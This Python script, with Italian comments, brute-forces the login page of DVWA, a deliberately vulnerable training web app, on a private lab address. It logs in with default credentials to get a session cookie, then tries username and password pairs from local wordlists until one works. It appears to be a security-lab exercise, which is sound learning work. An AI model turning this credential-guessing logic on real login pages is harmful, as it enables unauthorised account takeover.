import requests
from colorama import Fore

def firstLogin(t): # primo login per catturare il cookie
	url=f"{t}/login.php" 
	post_parameters={'username': 'admin', 'password': 'password','Login': 'Login'}
	header = {
		"Content-type": "application/x-www-form-urlencoded",
		"Accept": "text/html,application/html+xml"
		}
	r=requests.post(url,headers= header,data=post_parameters,allow_redirects=False)
	cookie=r.cookies['PHPSESSID']
	if(r.headers['Location'] == "index.php"):
	   print(f"Target -> {url}\nLoggato con :{Fore.GREEN} admin - password{Fore.WHITE}")
	return cookie

def bruteForce(t,c): #bruteforce su pagina brute 
	url = f"{t}/vulnerabilities/brute/"
	while True:
		security = input(f"Inserire il livello di sicurezza di DVWA ({Fore.GREEN}low,{Fore.YELLOW}medium,{Fore.RED}high{Fore.WHITE}):\n") #cookie sicurezza
		if security.lower() in {'low','medium','high'}:
			break
	flag=0
	username_file = open('/home/kali/Documenti/bruteforce-database/user.txt')
	password_file = open('/home/kali/Documenti/bruteforce-database/pass.txt')

	users = username_file.readlines()
	password = password_file.readlines()

	cookies = {
		"PHPSESSID":  c,
		"security" : security
	}

	for user in users: #brute con liste di file
		user = user.rstrip()
		for pas in password:
			pas = pas.rstrip()
			payload = f'?username={user}&password={pas}&Login=Login'
			request = requests.get(url + payload, cookies=cookies)
			if not"incorrect" in request.text:
				print(f"Target -> {url}\nLoggato con : {Fore.GREEN}{user} - {pas}{Fore.WHITE}")
				exit()
			else:
				flag=1
	if flag==1:
		print(f"{Fore.RED} Login Fallito!")


target="http://192.168.50.101/dvwa"
cookie=firstLogin(target)
bruteForce(target,cookie)
